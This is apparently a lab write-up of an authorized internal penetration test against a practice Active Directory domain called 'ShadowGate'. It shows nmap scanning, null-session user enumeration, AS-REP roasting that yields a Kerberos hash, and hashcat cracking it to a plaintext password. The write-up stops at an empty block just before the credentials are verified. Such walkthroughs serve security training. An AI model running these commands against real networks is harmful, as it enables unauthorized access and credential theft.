
# Objective and scope

**ShadowGate** recently completed a corporate acquisition that significantly expanded its internal network, user base, and application footprint. Several business-critical systems were migrated and consolidated under tight operational deadlines to minimize downtime and maintain service continuity.

While functional validation was completed, the organization deferred a comprehensive security assessment due to delivery pressure and staffing constraints. Leadership has since requested an independent penetration test to validate the security posture of the newly created environment and identify any material risk before the next audit cycle.

The assessment will evaluate whether a motivated attacker with standard network access could compromise sensitive systems, escalate privileges, or move laterally within the enterprise environment.

The Hack Smarter team has been authorized to perform a black box internal penetration test against the ShadowGate environment.

# Host file setup

```python
sudo nxc smb 10.1.180.146 --generate-hosts-file /etc/hosts
[sudo] password for kali: 
SMB         10.1.180.146    445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:shadow.gate) (signing:False) (SMBv1:None)
```

- SMB signing is off

# Enumeration

## Open ports
```python
nmap -p- --min-rate=2000 -sT dc01.shadow.gate -Pn
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-01-15 13:41:20Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: shadow.gate, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: shadow.gate, Site: Default-First-Site-Name)
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: shadow.gate, Site: Default-First-Site-Name)
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: shadow.gate, Site: Default-First-Site-Name)
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
9389/tcp  open  mc-nmf        .NET Message Framing
```

## Nmap
```python
nmap -p 53,80,88,135,139,389,445,464,593,636,3268,3269,3389,5985,9389 -A --min-rate=2000 -sT dc01.shadow.gate 
Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-10 18:37 +0100
Nmap scan report for dc01.shadow.gate (10.1.180.146)
Host is up (0.096s latency).
rDNS record for 10.1.180.146: DC01.shadow.gate

PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows Server
|_http-server-header: Microsoft-IIS/10.0
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-05-10 17:37:42Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: shadow.gate, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.shadow.gate
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.shadow.gate
| Not valid before: 2026-01-15T01:10:24
|_Not valid after:  2027-01-15T01:10:24
|_ssl-date: TLS randomness does not represent time
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: shadow.gate, Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC01.shadow.gate
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.shadow.gate
| Not valid before: 2026-01-15T01:10:24
|_Not valid after:  2027-01-15T01:10:24
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: shadow.gate, Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC01.shadow.gate
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.shadow.gate
| Not valid before: 2026-01-15T01:10:24
|_Not valid after:  2027-01-15T01:10:24
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: shadow.gate, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.shadow.gate
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.shadow.gate
| Not valid before: 2026-01-15T01:10:24
|_Not valid after:  2027-01-15T01:10:24
|_ssl-date: TLS randomness does not represent time
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=DC01.shadow.gate
| Not valid before: 2026-01-11T02:45:29
|_Not valid after:  2026-07-13T02:45:29
| rdp-ntlm-info: 
|   Target_Name: SHADOW
|   NetBIOS_Domain_Name: SHADOW
|   NetBIOS_Computer_Name: DC01
|   DNS_Domain_Name: shadow.gate
|   DNS_Computer_Name: DC01.shadow.gate
|   Product_Version: 10.0.20348
|_  System_Time: 2026-05-10T17:38:31+00:00
|_ssl-date: 2026-05-10T17:39:11+00:00; 0s from scanner time.
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp open  mc-nmf        .NET Message Framing
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
No OS matches for host
Network Distance: 3 hops
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
```
The webserver running is just a default IIS server

# SMB (445)

## Null auth
```python
nxc smb dc01.shadow.gate -u '' -p '' --users-export users.txt
SMB         10.1.180.146    445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:shadow.gate) (signing:False) (SMBv1:None)
SMB         10.1.180.146    445    DC01             [+] shadow.gate\: 
SMB         10.1.180.146    445    DC01             -Username-                    -Last PW Set-       -BadPW- -Description-                                               
SMB         10.1.180.146    445    DC01             Administrator                 2026-01-11 11:33:05 0       Built-in account for administering the computer/domain 
SMB         10.1.180.146    445    DC01             Guest                         <never>             0       Built-in account for guest access to the computer/domain 
SMB         10.1.180.146    445    DC01             krbtgt                        2026-01-12 02:45:27 0       Key Distribution Center Service Account 
SMB         10.1.180.146    445    DC01             ATHENA                        2026-03-04 15:23:19 0        
SMB         10.1.180.146    445    DC01             mbrownlee                     2026-03-04 15:24:05 0        
SMB         10.1.180.146    445    DC01             bbrown                        2026-01-15 14:24:07 0        
SMB         10.1.180.146    445    DC01             jtrueblood                    2026-04-28 18:14:47 0        
SMB         10.1.180.146    445    DC01             jsmith                        2026-03-04 15:26:29 0        
SMB         10.1.180.146    445    DC01             clocke                        2026-03-04 15:24:32 0        
SMB         10.1.180.146    445    DC01             tclarke                       2026-03-04 15:25:33 0        
SMB         10.1.180.146    445    DC01             jbradford                     2026-03-04 15:24:59 0        
SMB         10.1.180.146    445    DC01             amoss                         2026-03-04 15:25:52 0        
SMB         10.1.180.146    445    DC01             [*] Enumerated 12 local users: SHADOW
SMB         10.1.180.146    445    DC01             [*] Writing 12 local users to users.txt
```
I am able to use null auth to dump users but not able to list shares

The guest account is disabled

# AS-REP roasting leads to user compromised

```python
nxc ldap dc01.shadow.gate -u users.txt -p '' --asreproast asrep.hash             
LDAP        10.1.130.196    389    DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:shadow.gate) (signing:None) (channel binding:Never) 
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
LDAP        10.1.130.196    389    DC01             $krb5asrep$23$jtrueblood@SHADOW.GATE:eaa351956f6d85d764b2bb1dc7829e68$d77aa89f900cdbe3580df5fcb6c7de8528ee114d5025e47cbf4a347833b9ba86e53e653fa9c39926f99d8e66693c19ff5d4d1b7a874431dd7960ec88fc43fb1b7178c920cc90806dced395f5276d137d9b76fb2bcdb2770b45ac46d4ecf13b39dec451afa97e38c3be9b59ef97d824cd2e1890129bba190b04b72e9c345cee041dedcaf6a75c102a3f38a639641bb0b0128ff2814dba990b6e045db85b67609248567ef143697a563b20f1314ce698ae4a4ea4f217671ca50471d5b5dda5ba39a896e376c6cc32d7951dac528a2983a6098e11e61b70cdb7d9ef315288d83d8006a950e6e41432f75e98
```
Found a hash for a user account

## Cracking the hash
```python
hashcat asrep.hash /usr/share/wordlists/rockyou.txt

$krb5asrep$23$jtrueblood@SHADOW.GATE:eaa351956f6d85d764b2bb1dc7829e68$d77aa89f900cdbe3580df5fcb6c7de8528ee114d5025e47cbf4a347833b9ba86e53e653fa9c39926f99d8e66693c19ff5d4d1b7a874431dd7960ec88fc43fb1b7178c920cc90806dced395f5276d137d9b76fb2bcdb2770b45ac46d4ecf13b39dec451afa97e38c3be9b59ef97d824cd2e1890129bba190b04b72e9c345cee041dedcaf6a75c102a3f38a639641bb0b0128ff2814dba990b6e045db85b67609248567ef143697a563b20f1314ce698ae4a4ea4f217671ca50471d5b5dda5ba39a896e376c6cc32d7951dac528a2983a6098e11e61b70cdb7d9ef315288d83d8006a950e6e41432f75e98:blood_brothers
```
The hash cracked

```python
jtrueblood:blood_brothers
```
Ill verify these credentials

```python

```